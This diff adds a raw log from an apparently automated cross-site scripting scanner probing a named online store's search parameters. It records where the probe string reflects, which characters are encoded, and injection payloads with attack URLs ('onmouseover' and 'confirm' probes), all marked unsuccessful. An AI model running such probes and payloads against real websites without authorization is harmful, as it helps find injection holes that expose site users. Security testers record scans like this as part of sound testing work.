@@ -1,0 +1,168 @@
+https://www.tatsoul.com/supplies/index.php?main_page=index&cPath=878_291
+
+GET Params:[5]
+['main_page', 'q', 'search_in_description', 'zenid', 'keyword']
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/supplies/index.php?main_page=klevu_search&main_page=(uvw"xyz'yxz</zxy&q=Search
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/supplies/index.php?main_page=klevu_search&main_page=klevu_search&q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="hidden" name="searchedKeyword" id="searchedKeyword" value="(uvw&#34;xyzyxz/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=(uvw"xyz'yxz</zxy&search_in_description=1&zenid=&keyword=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=(uvw"xyz'yxz</zxy&zenid=&keyword=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=1&zenid=(uvw"xyz'yxz</zxy&keyword=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=1&zenid=&keyword=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input type="text" name="keyword" value="(uvw&quot;xyz'yxz/zxy" onfocus="RemoveFormatString(this, 'keywords')" />
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+    var klevu_cms_module_enabled = true,
+      klevu_cmsSearchEnabled = false,
+      klevu_current_version = '20.0.1';
+    var klevu_storeLandingPageUrl = 'https://www.tatsoul.com/supplies/index.php?main_page=klevu_search',
+      klevu_showQuickSearchOnEnter = false,
+      klevu_searchQueryParam = '(uvw"xyz'yxz/zxy';
+    var klevu_apiKey = 'klevu-157297786822611051',
+      searchTextBoxName = 'klevu_search',
+      klevu_lang = 'en',
+      klevu_result_top_margin = '',
+      klevu_result_left_margin = '';
+    (function () {
+      var ws = document.createElement('script'),
+        kl_protocol = ("https:" === document.location.protocol ? "https://" : "http://");
+      ws.type = 'text/javascript';
+      ws.async = true;
+      ws.src = kl_protocol + 'js.klevu.com/klevu-js-v1/js/klevu-webstore.js';
+      ws.charset = "UTF-8";
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(ws, s);
+    })();
+  </script>
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<link rel="canonical" href="https://www.tatsoul.com/supplies/index.php?main_page=advanced_search&amp;keyword=%28uvw%22xyz%27yxz%2Fzxy" />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=1&zenid=&keyword=' onmouseover='alert(1)
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	False	True	True	False
+
+Attack Payloads for SCRIPT
+['"; confirm(1); "']
+
+SCRIPT Attack Url: https://www.tatsoul.com/index.php?main_page=advanced_search_result&main_page=advanced_search_result&search_in_description=1&zenid=&keyword="; confirm(1); "
+
+ ______ UnSuccessful with payload: "; confirm(1); "
+
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
